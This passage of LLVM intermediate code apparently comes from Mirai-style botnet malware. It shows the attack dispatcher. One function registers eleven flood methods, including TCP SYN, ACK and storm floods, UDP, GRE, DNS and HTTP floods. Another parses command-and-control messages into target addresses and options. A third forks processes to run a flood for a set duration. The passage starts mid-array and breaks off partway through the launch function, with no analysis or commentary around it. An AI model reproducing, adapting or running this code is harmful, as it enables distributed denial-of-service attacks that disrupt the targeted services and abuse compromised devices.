x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcp)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_stdhex)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udprandom)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstorm)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  br i1 %4, label %5, label %24

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %1, align 4
  br label %2

; <label>:24:                                     ; preds = %2
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %219

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %17
  br label %219

; <label>:31:                                     ; preds = %17
  %32 = load i8*, i8** %3, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %3, align 8
  %34 = load i8, i8* %32, align 1
  store i8 %34, i8* %7, align 1
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 1
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  %39 = load i32, i32* %4, align 4
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %31
  br label %219

; <label>:42:                                     ; preds = %31
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  %45 = load i8, i8* %43, align 1
  store i8 %45, i8* %8, align 1
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = sub i64 %47, 1
  %49 = trunc i64 %48 to i32
  store i32 %49, i32* %4, align 4
  %50 = load i8, i8* %8, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %42
  br label %219

; <label>:54:                                     ; preds = %42
  %55 = load i32, i32* %4, align 4
  %56 = sext i32 %55 to i64
  %57 = load i8, i8* %8, align 1
  %58 = zext i8 %57 to i64
  %59 = mul i64 5, %58
  %60 = icmp ult i64 %56, %59
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %54
  br label %219

; <label>:62:                                     ; preds = %54
  %63 = load i8, i8* %8, align 1
  %64 = zext i8 %63 to i64
  %65 = call noalias i8* @calloc(i64 %64, i64 24) #6
  %66 = bitcast i8* %65 to %struct.attack_target*
  store %struct.attack_target* %66, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %67

; <label>:67:                                     ; preds = %114, %62
  %68 = load i32, i32* %5, align 4
  %69 = load i8, i8* %8, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp slt i32 %68, %70
  br i1 %71, label %72, label %117

; <label>:72:                                     ; preds = %67
  %73 = load i8*, i8** %3, align 8
  %74 = bitcast i8* %73 to i32*
  %75 = load i32, i32* %74, align 4
  %76 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %77 = load i32, i32* %5, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %76, i64 %78
  %80 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %79, i32 0, i32 1
  store i32 %75, i32* %80, align 4
  %81 = load i8*, i8** %3, align 8
  %82 = getelementptr inbounds i8, i8* %81, i64 4
  store i8* %82, i8** %3, align 8
  %83 = load i8*, i8** %3, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %3, align 8
  %85 = load i8, i8* %83, align 1
  %86 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %87 = load i32, i32* %5, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i64 %88
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %89, i32 0, i32 2
  store i8 %85, i8* %90, align 4
  %91 = load i32, i32* %4, align 4
  %92 = sext i32 %91 to i64
  %93 = sub i64 %92, 5
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %4, align 4
  %95 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 0
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %99, i32 0, i32 0
  store i16 2, i16* %100, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 1
  %106 = load i32, i32* %105, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 2
  %113 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %112, i32 0, i32 0
  store i32 %106, i32* %113, align 4
  br label %114

; <label>:114:                                    ; preds = %72
  %115 = load i32, i32* %5, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %5, align 4
  br label %67

; <label>:117:                                    ; preds = %67
  %118 = load i32, i32* %4, align 4
  %119 = sext i32 %118 to i64
  %120 = icmp ult i64 %119, 1
  br i1 %120, label %121, label %122

; <label>:121:                                    ; preds = %117
  br label %219

; <label>:122:                                    ; preds = %117
  %123 = load i8*, i8** %3, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %3, align 8
  %125 = load i8, i8* %123, align 1
  store i8 %125, i8* %9, align 1
  %126 = load i32, i32* %4, align 4
  %127 = sext i32 %126 to i64
  %128 = sub i64 %127, 1
  %129 = trunc i64 %128 to i32
  store i32 %129, i32* %4, align 4
  %130 = load i8, i8* %9, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp sgt i32 %131, 0
  br i1 %132, label %133, label %211

; <label>:133:                                    ; preds = %122
  %134 = load i8, i8* %9, align 1
  %135 = zext i8 %134 to i64
  %136 = call noalias i8* @calloc(i64 %135, i64 16) #6
  %137 = bitcast i8* %136 to %struct.attack_option*
  store %struct.attack_option* %137, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %138

; <label>:138:                                    ; preds = %207, %133
  %139 = load i32, i32* %5, align 4
  %140 = load i8, i8* %9, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %139, %141
  br i1 %142, label %143, label %210

; <label>:143:                                    ; preds = %138
  %144 = load i32, i32* %4, align 4
  %145 = sext i32 %144 to i64
  %146 = icmp ult i64 %145, 1
  br i1 %146, label %147, label %148

; <label>:147:                                    ; preds = %143
  br label %219

; <label>:148:                                    ; preds = %143
  %149 = load i8*, i8** %3, align 8
  %150 = getelementptr inbounds i8, i8* %149, i32 1
  store i8* %150, i8** %3, align 8
  %151 = load i8, i8* %149, align 1
  %152 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %153 = load i32, i32* %5, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %155, i32 0, i32 1
  store i8 %151, i8* %156, align 8
  %157 = load i32, i32* %4, align 4
  %158 = sext i32 %157 to i64
  %159 = sub i64 %158, 1
  %160 = trunc i64 %159 to i32
  store i32 %160, i32* %4, align 4
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 1
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %148
  br label %219

; <label>:165:                                    ; preds = %148
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  store i8 %168, i8* %12, align 1
  %169 = load i32, i32* %4, align 4
  %170 = sext i32 %169 to i64
  %171 = sub i64 %170, 1
  %172 = trunc i64 %171 to i32
  store i32 %172, i32* %4, align 4
  %173 = load i32, i32* %4, align 4
  %174 = load i8, i8* %12, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp slt i32 %173, %175
  br i1 %176, label %177, label %178

; <label>:177:                                    ; preds = %165
  br label %219

; <label>:178:                                    ; preds = %165
  %179 = load i8, i8* %12, align 1
  %180 = zext i8 %179 to i32
  %181 = add nsw i32 %180, 1
  %182 = sext i32 %181 to i64
  %183 = call noalias i8* @calloc(i64 %182, i64 1) #6
  %184 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %185 = load i32, i32* %5, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %187, i32 0, i32 0
  store i8* %183, i8** %188, align 8
  %189 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %190 = load i32, i32* %5, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %192, i32 0, i32 0
  %194 = load i8*, i8** %193, align 8
  %195 = load i8*, i8** %3, align 8
  %196 = load i8, i8* %12, align 1
  %197 = zext i8 %196 to i32
  call void @util_memcpy(i8* %194, i8* %195, i32 %197)
  %198 = load i8, i8* %12, align 1
  %199 = zext i8 %198 to i32
  %200 = load i8*, i8** %3, align 8
  %201 = sext i32 %199 to i64
  %202 = getelementptr inbounds i8, i8* %200, i64 %201
  store i8* %202, i8** %3, align 8
  %203 = load i8, i8* %12, align 1
  %204 = zext i8 %203 to i32
  %205 = load i32, i32* %4, align 4
  %206 = sub nsw i32 %205, %204
  store i32 %206, i32* %4, align 4
  br label %207

; <label>:207:                                    ; preds = %178
  %208 = load i32, i32* %5, align 4
  %209 = add nsw i32 %208, 1
  store i32 %209, i32* %5, align 4
  br label %138

; <label>:210:                                    ; preds = %138
  br label %211

; <label>:211:                                    ; preds = %210, %122
  %212 = call i32* @__errno_location() #7
  store i32 0, i32* %212, align 4
  %213 = load i32, i32* %6, align 4
  %214 = load i8, i8* %7, align 1
  %215 = load i8, i8* %8, align 1
  %216 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %217 = load i8, i8* %9, align 1
  %218 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %213, i8 zeroext %214, i8 zeroext %215, %struct.attack_target* %216, i8 zeroext %217, %struct.attack_option* %218)
  br label %219

; <label>:219:                                    ; preds = %211, %177, %164, %147, %121, %61, %53, %41, %30, %16
  %220 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %221 = icmp ne %struct.attack_target* %220, null
  br i1 %221, label %222, label %225

; <label>:222:                                    ; preds = %219
  %223 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %224 = bitcast %struct.attack_target* %223 to i8*
  call void @free(i8* %224) #6
  br label %225

; <label>:225:                                    ; preds = %222, %219
  %226 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %227 = icmp ne %struct.attack_option* %226, null
  br i1 %227, label %228, label %232

; <label>:228:                                    ; preds = %225
  %229 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %230 = load i8, i8* %9, align 1
  %231 = zext i8 %230 to i32
  call void @free_opts(%struct.attack_option* %229, i32 %231)
  br label %232

; <label>:232:                                    ; preds = %228, %225
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %6
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @fork() #6
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %23
  call void @exit(i32 0) #8
  unreachable

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 %32)
  %34 = call i32 @getppid() #6
  %35 = call i32 @kill(i32 %34, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:36:                                     ; preds = %28
  store i32 0, i32* %15, align 4
  br label %37

; <label>:37:                                     ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %70

; <label>:42:                                     ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

; <label>:54:                                     ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
